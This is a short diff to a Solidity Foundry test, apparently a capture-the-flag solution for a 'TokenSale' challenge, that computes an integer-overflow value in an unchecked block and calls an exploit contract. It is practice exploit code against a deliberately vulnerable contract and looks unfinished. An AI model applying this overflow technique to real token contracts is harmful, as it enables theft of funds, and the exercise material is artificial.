@@ -16,9 +16,19 @@ contract TokenSaleTest is Test {
     }
 
     // Use the instance of tokenSale and exploitContract
+//     584007913129639935
     function testIncrement() public {
         // Put your solution here
+        uint256 number;
+        unchecked {
+            number = (((UINT256_MAX+584007913129639935) / 1 ether)) * 1 ether;
 
+            // 2**256 / 10**18
+        }
+        console.log(number);
+        console.log(UINT256_MAX-1);
+
+        exploitContract.exploit{value: 0 ether}();
         _checkSolved();
     }
 
